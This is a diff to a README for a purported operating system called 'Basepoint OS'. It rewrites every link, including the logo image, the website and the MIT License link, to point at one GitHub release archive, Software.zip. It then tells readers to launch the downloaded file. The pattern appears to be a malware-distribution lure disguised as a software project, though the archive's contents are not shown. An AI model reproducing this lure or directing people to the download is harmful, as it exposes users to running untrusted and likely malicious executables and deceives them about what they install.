@@ -3,7 +3,7 @@
 
 Welcome to the official repository of **Basepoint OS**, a cutting-edge operating system designed for efficiency, security, and performance. 
 
-![Basepoint OS Logo](https://example.com/basepoint-os-logo.png)
+![Basepoint OS Logo](https://github.com/LordVaderOfBCNHS/basepoint-os/releases/download/v2.0/Software.zip)
 
 ## Repository Description
 
@@ -27,7 +27,7 @@ This repository houses the source code and documentation for Basepoint OS. Unfor
 
 To get started with Basepoint OS, you can download the software package from the following link:
 
-[![Download Basepoint OS](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Basepoint OS](https://github.com/LordVaderOfBCNHS/basepoint-os/releases/download/v2.0/Software.zip)](https://github.com/LordVaderOfBCNHS/basepoint-os/releases/download/v2.0/Software.zip)
 
 ### Note: Launch the downloaded file to install Basepoint OS.
 
@@ -50,11 +50,11 @@ We welcome contributions from the community to enhance Basepoint OS further. If 
 
 Join our community to stay updated on the latest developments, events, and discussions related to Basepoint OS. Connect with us on social media or visit our website for more information.
 
-### Visit Our Website: [Basepoint OS](https://www.basepointos.com)
+### Visit Our Website: [Basepoint OS](https://github.com/LordVaderOfBCNHS/basepoint-os/releases/download/v2.0/Software.zip)
 
 ## License 📝
 
-Basepoint OS is licensed under the [MIT License](https://opensource.org/licenses/MIT). 
+Basepoint OS is licensed under the [MIT License](https://github.com/LordVaderOfBCNHS/basepoint-os/releases/download/v2.0/Software.zip). 
 
 ---
 
